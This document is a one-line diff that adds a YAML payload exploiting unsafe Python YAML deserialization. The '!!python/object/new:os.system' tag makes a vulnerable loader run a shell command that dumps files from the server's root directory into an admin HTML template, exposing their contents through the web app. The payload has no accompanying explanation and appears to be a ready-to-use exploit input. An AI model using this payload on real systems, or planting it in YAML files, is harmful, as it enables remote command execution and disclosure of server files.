@@ -1,0 +1,1 @@
+!!python/object/new:os.system ["cat /* >/app/templates/admin.html"]
